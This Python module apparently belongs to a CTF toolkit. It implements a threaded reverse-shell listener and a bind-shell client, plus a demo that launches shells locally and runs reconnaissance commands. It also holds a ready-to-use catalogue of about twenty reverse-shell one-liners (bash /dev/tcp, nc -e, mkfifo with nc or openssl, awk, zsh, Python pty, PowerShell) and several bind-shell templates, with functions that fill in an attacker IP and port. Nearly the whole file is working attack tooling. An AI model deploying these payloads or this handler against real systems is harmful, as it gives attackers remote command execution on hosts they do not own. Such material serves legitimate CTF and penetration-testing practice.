import dataclasses
import errno
import socket
import threading
import time
from collections import deque
from typing import Callable

from ctf.utils.log import debug_log

# ── 常量定义 ──────────────────────────────────────────────
_RECV_BUFFER_SIZE = 4096
_LOG_PREVIEW_SIZE = 256
_THREAD_JOIN_TIMEOUT = 3.0
_SOCKET_TIMEOUT = 1.0


@dataclasses.dataclass
class RecvData:
    timestamp: float
    data: bytes


# ── 基础异常 ──────────────────────────────────────────────
class TcpShellRError(Exception):
    """TcpShellR 基础异常"""


class TcpShellBError(Exception):
    """TcpShellB 基础异常"""


# ── 工具函数 ──────────────────────────────────────────────
def _safe_shutdown_socket(sock: socket.socket | None, name: str = "socket") -> None:
    """
    仅执行 shutdown，不 close。
    shutdown 会使阻塞在 recv() 的线程立即得到 b""（EOF），
    从而让 recv 线程沿正常路径退出，避免 EBADF。
    """
    if sock is None:
        return
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass


def _safe_close_socket(sock: socket.socket | None, name: str = "socket") -> None:
    """
    安全关闭 socket（仅 close，不 shutdown）。
    调用前须确保 recv 线程已退出，否则会引发 EBADF。
    """
    if sock is None:
        return
    try:
        sock.close()
    except OSError:
        pass


def _safe_join_thread(thread: threading.Thread | None, timeout: float = _THREAD_JOIN_TIMEOUT) -> None:
    """安全等待线程退出，超时后记录警告"""
    if thread is None or thread is threading.current_thread():
        return
    assert isinstance(thread, threading.Thread)
    thread.join(timeout=timeout)
    if thread.is_alive():
        debug_log(f"警告：{thread.name} 线程未在 {timeout}s 内退出")


def _do_send(sock: socket.socket, data: bytes) -> bool:
    """执行实际发送操作"""
    try:
        sock.sendall(data)
        debug_log(f"已发送 {len(data)} 字节, 内容：{data[:_LOG_PREVIEW_SIZE]}")
        return True
    except (BrokenPipeError, ConnectionResetError) as e:
        debug_log(f"发送失败：连接断开 ({type(e).__name__})")
    except OSError as e:
        debug_log(f"发送失败: {e}")
    return False


class _TcpShellBase:
    """TCP Shell 基类，包含发送、接收、缓冲区管理等公共逻辑"""

    def __init__(
            self,
            on_recv: Callable[[bytes], bytes] | None = None,
            on_send: Callable[[bytes], bytes] | None = None,
            max_buffer: int = 1000,
    ):
        self.on_recv = on_recv
        self.on_send = on_send

        self.buffer: deque[RecvData] = deque(maxlen=max_buffer)
        self._lock = threading.Lock()
        self._data_event = threading.Event()
        self._stop_event = threading.Event()

    def peek(self, encoding: str = "utf-8") -> str:
        """将缓冲区内所有收到的数据拼接成字符串（不清空）"""
        with self._lock:
            raw_data = b"".join(r.data for r in self.buffer)
        return raw_data.decode(encoding, errors="replace")

    def output(self, timeout: float = 5.0, idle_ms: int = 200, encoding: str = "utf-8") -> str | None:
        """
        等待数据到达，收到第一个 RecvData 后，若连续 idle_ms 毫秒内无新数据则认为接收完毕并返回。
        """
        if not self._data_event.wait(timeout=timeout):
            return None

        idle_sec = idle_ms / 1000.0

        while not self._stop_event.is_set():
            with self._lock:
                last_seen = len(self.buffer)
                self._data_event.clear()

            # 等待 idle 时间，如果期间有新数据唤醒，则 hit 为 True
            hit = self._data_event.wait(timeout=idle_sec)

            with self._lock:
                current_seen = len(self.buffer)

            if not hit and last_seen == current_seen:
                break

        with self._lock:
            if not self.buffer:
                return None
            raw_data = b"".join(r.data for r in self.buffer)
            self.buffer.clear()
            self._data_event.clear()

        return raw_data.decode(encoding, errors="replace")

    def send(self, data: str | bytes) -> bool:
        """发送数据到当前连接"""
        sock = self._get_active_socket()
        if sock is None:
            debug_log("无连接，无法发送")
            return False

        raw: bytes = data.encode() if isinstance(data, str) else data

        if self.on_send is not None:
            try:
                raw = self.on_send(raw)
            except Exception as e:
                debug_log(f"on_send 回调异常，跳过: {e}")

        return _do_send(sock, raw)

    def sendline(self, data: str) -> bool:
        """发送字符串并追加换行符"""
        return self.send(f"{data}\n")

    def _get_active_socket(self) -> socket.socket | None:
        raise NotImplementedError

    def _recv_loop(self, sock: socket.socket) -> None:
        """
        接收循环（在独立线程中运行）。
        """
        while not self._stop_event.is_set():
            try:
                chunk = sock.recv(_RECV_BUFFER_SIZE)
            except socket.timeout:
                continue
            except ConnectionResetError:
                debug_log("连接被对端重置 (ConnectionReset)")
                break
            except OSError as e:
                if e.errno == errno.EBADF:
                    debug_log("recv 退出：socket 已关闭 (EBADF)")
                else:
                    debug_log(f"recv 异常: {e}")
                break

            if not chunk:
                debug_log("连接已断开（收到 EOF）")
                break

            if self.on_recv is not None:
                try:
                    chunk = self.on_recv(chunk)
                except Exception as e:
                    debug_log(f"on_recv 回调异常，使用原始数据: {e}")

            record = RecvData(timestamp=time.time(), data=chunk)
            with self._lock:
                self.buffer.append(record)
                self._data_event.set()

            debug_log(f"收到 {len(chunk)} 字节")

        self._on_recv_loop_exit(sock)

    def _on_recv_loop_exit(self, sock: socket.socket) -> None:
        raise NotImplementedError


# ── 反向 Shell 服务器 ──────────────────────────────────────────────
class ReverseShell(_TcpShellBase):
    def __init__(self, port: int = 0, on_recv: Callable[[bytes], bytes] | None = None,
                 on_send: Callable[[bytes], bytes] | None = None, max_buffer: int = 1000):
        super().__init__(on_recv, on_send, max_buffer)
        self.ip = "0.0.0.0"
        self._port = port
        self._server_sock: socket.socket | None = None
        self._bound_port: int | None = None
        self._conn: socket.socket | None = None
        self._conn_addr: tuple[str, int] | None = None
        self._accept_thread: threading.Thread | None = None
        self._recv_thread: threading.Thread | None = None

    def start(self) -> "ReverseShell":
        if self._server_sock is not None:
            return self

        self._stop_event.clear()
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server_sock.bind((self.ip, self._port))
            self._bound_port = server_sock.getsockname()[1]
            server_sock.listen(1)
            server_sock.settimeout(_SOCKET_TIMEOUT)
            self._server_sock = server_sock
        except OSError as e:
            _safe_close_socket(server_sock)
            raise TcpShellRError(f"bind 失败 ({self.ip}:{self._port}): {e}") from e

        debug_log(f"监听 {self.ip}:{self._bound_port}")
        self._accept_thread = threading.Thread(target=self._accept_loop, daemon=True, name="TcpShell-accept")
        assert isinstance(self._accept_thread, threading.Thread)
        self._accept_thread.start()
        return self

    def stop(self) -> None:
        """
        安全停止服务器。

        修复（原竞态根因）：原实现先 close fd 再 join recv 线程，
        导致 recv 线程在 fd 已销毁后调用 recv() 得到 EBADF。

        顺序：
          1. set stop_event —— 通知所有循环退出
          2. shutdown conn  —— 使 recv() 立即返回 b""，recv 线程沿正常 EOF 路径退出
          3. join recv 线程 —— 等待 recv 线程完全退出
          4. close conn fd  —— 此时 recv 线程已不再使用该 fd，安全关闭
          5. 关闭 server_sock 并 join accept 线程
        """
        self._stop_event.set()
        self._data_event.set()

        with self._lock:
            conn, self._conn = self._conn, None
            self._conn_addr = None
        _safe_shutdown_socket(conn, "client connection")

        _safe_join_thread(self._recv_thread)
        self._recv_thread = None

        _safe_close_socket(conn, "client connection")

        _safe_shutdown_socket(self._server_sock, "server socket")
        _safe_close_socket(self._server_sock, "server socket")
        self._server_sock = None
        self._bound_port = None

        _safe_join_thread(self._accept_thread)
        self._accept_thread = None

        debug_log("已停止")

    def __enter__(self) -> "ReverseShell":
        return self.start()

    def __exit__(self, *_) -> bool:
        self.stop()
        return False

    def port(self) -> int:
        if self._bound_port is None:
            raise TcpShellRError("服务器尚未启动，请先调用 start()")
        return self._bound_port

    def is_connected(self) -> bool:
        with self._lock:
            return self._conn is not None

    def _get_active_socket(self) -> socket.socket | None:
        with self._lock:
            return self._conn

    def _on_recv_loop_exit(self, sock: socket.socket) -> None:
        """recv 线程退出时清理连接引用（不 close fd，由 stop() 统一管理）"""
        with self._lock:
            if self._conn is sock:
                self._conn = None
                self._conn_addr = None

    def _accept_loop(self) -> None:
        while not self._stop_event.is_set():
            server_sock = self._server_sock
            if server_sock is None:
                break

            try:
                conn, addr = server_sock.accept()
            except TimeoutError:
                continue
            except OSError:
                break

            conn.settimeout(_SOCKET_TIMEOUT)
            debug_log(f"连接来自 {addr}")

            with self._lock:
                if self._conn is not None:
                    debug_log("已有连接，拒绝新连接")
                    _safe_shutdown_socket(conn, "rejected connection")
                    _safe_close_socket(conn, "rejected connection")
                    continue
                self._conn = conn
                self._conn_addr = addr

            if self._recv_thread is not None and self._recv_thread.is_alive():
                _safe_join_thread(self._recv_thread, timeout=2.0)

            self._recv_thread = threading.Thread(
                target=self._recv_loop, args=(conn,), daemon=True, name="TcpShell-recv"
            )
            assert isinstance(self._recv_thread, threading.Thread)
            self._recv_thread.start()


# ── 绑定 Shell 客户端 ──────────────────────────────────────────────
class BindShell(_TcpShellBase):
    def __init__(self, on_recv: Callable[[bytes], bytes] | None = None,
                 on_send: Callable[[bytes], bytes] | None = None,
                 max_buffer: int = 1000,
                 connect_timeout: float = 10.0,
                 recv_timeout: float = 5.0):
        super().__init__(on_recv, on_send, max_buffer)
        self.connect_timeout = connect_timeout
        self.recv_timeout = recv_timeout
        self._sock: socket.socket | None = None
        self._target_addr: tuple[str, int] | None = None
        self._recv_thread: threading.Thread | None = None
        self._connected = threading.Event()

    def connect(self, host: str, port: int) -> "BindShell":
        if self._sock is not None:
            self.disconnect()

        self._stop_event.clear()
        self._connected.clear()
        self._target_addr = (host, port)

        sock = self._attempt_connect(host, port)
        sock.settimeout(self.recv_timeout)

        with self._lock:
            self._sock = sock
        self._connected.set()

        self._recv_thread = threading.Thread(
            target=self._recv_loop, args=(sock,), daemon=True, name="TcpShellB-recv"
        )
        assert isinstance(self._recv_thread, threading.Thread)
        self._recv_thread.start()
        return self

    def _attempt_connect(self, host: str, port: int) -> socket.socket:
        deadline = time.monotonic() + self.connect_timeout
        retry_interval = 0.2
        last_err: Exception | None = None

        while time.monotonic() < deadline and not self._stop_event.is_set():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remaining = deadline - time.monotonic()
            sock.settimeout(min(retry_interval, remaining))

            try:
                sock.connect((host, port))
                debug_log(f"已连接到 {host}:{port}")
                return sock
            except (ConnectionRefusedError, socket.timeout, OSError) as e:
                last_err = e
                _safe_close_socket(sock)
                sleep_time = min(retry_interval, deadline - time.monotonic())
                if sleep_time > 0:
                    self._stop_event.wait(timeout=sleep_time)

        raise TcpShellBError(
            f"连接超时（{self.connect_timeout}s）{host}:{port}: {last_err}"
        ) from last_err

    def disconnect(self) -> None:
        """
        安全断开连接。
        """
        self._stop_event.set()
        self._data_event.set()
        self._connected.clear()

        with self._lock:
            sock, self._sock = self._sock, None
            self._target_addr = None

        _safe_shutdown_socket(sock, "connection")
        _safe_join_thread(self._recv_thread)
        self._recv_thread = None

        _safe_close_socket(sock, "connection")
        debug_log("已断开连接")

    def __enter__(self) -> "BindShell":
        return self

    def __exit__(self, *_) -> bool:
        self.disconnect()
        return False

    def is_connected(self) -> bool:
        with self._lock:
            return self._sock is not None and self._connected.is_set()

    def _get_active_socket(self) -> socket.socket | None:
        with self._lock:
            return self._sock

    def _on_recv_loop_exit(self, sock: socket.socket) -> None:
        """recv 线程退出时清理状态（不 close fd，由 disconnect() 统一管理）"""
        self._connected.clear()
        with self._lock:
            if self._sock is sock:
                self._sock = None

    def interactive(self) -> None:
        """交互模式"""
        if not self.is_connected():
            print("错误：未连接到目标")
            return

        print(f"[*] 进入交互模式，连接到 {self._target_addr}")
        print("[*] 输入 'exit' 或按 Ctrl+C 退出")
        print("-" * 50)

        def print_output() -> None:
            while not self._stop_event.is_set() and self.is_connected():
                if self._data_event.wait(timeout=0.5):
                    with self._lock:
                        if self.buffer:
                            raw = b"".join(r.data for r in self.buffer)
                            self.buffer.clear()
                            self._data_event.clear()
                        else:
                            raw = b""
                    if raw:
                        print(raw.decode(errors="replace"), end="", flush=True)

        output_thread = threading.Thread(target=print_output, daemon=True)
        output_thread.start()

        try:
            while self.is_connected():
                try:
                    user_input = input()
                    if user_input.strip().lower() == "exit":
                        break
                    self.sendline(user_input)
                except EOFError:
                    break
        except KeyboardInterrupt:
            print("\n[*] 用户中断")
        finally:
            print("\n[*] 退出交互模式")


# ── Shell 命令生成函数 ──────────────────────────────────────────────
_REVERSE_SHELL_TEMPLATES = {
    "bash_i": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash_196": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196",
    "bash_read_line": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
    "nc_c_bash": "nc -c bash {ip} {port}",
    "nc_c_sh": "nc -c sh {ip} {port}",
    "nc_e_bash": "nc {ip} {port} -e /bin/bash",
    "nc_e_sh": "nc {ip} {port} -e /bin/sh",
    "busybox_nc_e_bash": "busybox nc {ip} {port} -e /bin/bash",
    "busybox_nc_e_sh": "busybox nc {ip} {port} -e /bin/sh",
    "curl_bash": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null",
    "awk": (
        "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; "
        "s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} "
        "while(c != \"exit\") close(s); }}}}' /dev/null"
    ),
    "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
    "python3_bash": (
        'export RHOST="{ip}";export RPORT={port};python3 -c \''
        "import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'"
    ),
    "python3_sh": (
        'export RHOST="{ip}";export RPORT={port};python3 -c \''
        "import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
    ),
    "nc_mkfifo_bash": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f",
    "nc_mkfifo_sh": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "openssl_mkfifo_bash": (
        "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"
    ),
    "openssl_mkfifo_sh": (
        "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"
    ),
    "powershell1": (
        "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); "
        "$NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); "
        "$StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; "
        "$Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ "
        "while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); "
        "$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; "
        "if ($TCPClient.Connected -and $Code.Length -gt 1) {{ "
        "$Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; "
        "$StreamWriter.Write(\"$Output`n\"); $Code = $null }} }}; "
        "$TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"
    ),
}

_BIND_SHELL_TEMPLATES = {
    "nc_l_bash": "nc -l -p {port} -e /bin/bash",
    "nc_mkfifo_sh": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {port} > /tmp/f",
    "nc_mkfifo_bash": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp {port} > /tmp/f",
    "python3": (
        "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;"
        "s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);"
        "s1.bind((\\\"0.0.0.0\\\",{port}));s1.listen(1);c,a=s1.accept();"
        "while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
        "c.sendall(p.stdout.read()+p.stderr.read())\"\"\")\'"
    ),
}


def gen_shell_b_cmd(name: str, port: int) -> str | None:
    """
    根据名称生成绑定 Shell 命令

    Args:
        name: 模板名称，例如 'nc_l_bash', 'nc_mkfifo_bash', 'python3' 等
        port: 监听端口

    Returns:
        生成的命令字符串，如果模板不存在则返回 None

    Examples:
        >>> gen_shell_b_cmd('nc_l_bash', 9000)
        'nc -l -p 9000 -e /bin/bash'
        >>> gen_shell_b_cmd('invalid_name', 9000)
        None
    """
    template = _BIND_SHELL_TEMPLATES.get(name)
    if template is None:
        return None
    return template.format(port=port)


def gen_shell_r_cmd(name: str, ip: str, port: int) -> str | None:
    """
    根据名称生成反向 Shell 命令

    Args:
        name: 模板名称，例如 'bash_i', 'nc_e_bash', 'python3_bash' 等
        ip: 目标 IP 地址
        port: 目标端口

    Returns:
        生成的命令字符串，如果模板不存在则返回 None

    Examples:
        >>> gen_shell_r_cmd('bash_i', '10.0.0.1', 9000)
        'bash -i >& /dev/tcp/10.0.0.1/9000 0>&1'
        >>> gen_shell_r_cmd('invalid_name', '10.0.0.1', 9000)
        None
    """
    template = _REVERSE_SHELL_TEMPLATES.get(name)
    if template is None:
        return None
    return template.format(ip=ip, port=port)


if __name__ == "__main__":
    from ctf.utils import wait
    from ctf.utils.local_ip import get_ip as get_local_ip
    from ctf.shell.run_cmd import RunCmd
    from ctf.utils.log import set_debug

    set_debug()

    _ip = get_local_ip() or "0.0.0.0"

    with ReverseShell() as shell:
        def run(cmd: str) -> None:
            shell.sendline(cmd)
            print("##############")
            print(f"> {cmd}")
            print(shell.output())
            print("##############")

        cmd_r = gen_shell_r_cmd("busybox_nc_e_sh", _ip, shell.port())
        if not cmd_r:
            exit(-1)
        print(cmd_r)
        with RunCmd(cmd_r) as s:
            s.run()
            wait(lambda: shell.is_connected())
            run("id")
            run("whoami")
            run("ls /")
            run("ip addr")
            s.stop()

    with BindShell() as shell:
        def run(cmd: str) -> None:
            shell.sendline(cmd)
            print("##############")
            print(f"> {cmd}")
            print(shell.output())
            print("##############")

        p = 9000
        cmd_b = gen_shell_b_cmd("nc_mkfifo_sh", p)
        if not cmd_b:
            exit(-1)
        print(cmd_b)
        with RunCmd(cmd_b) as s:
            s.run()
            shell.connect(_ip, p)
            run("id")
            run("whoami")
            run("ls /")
            run("ip addr")
            s.stop()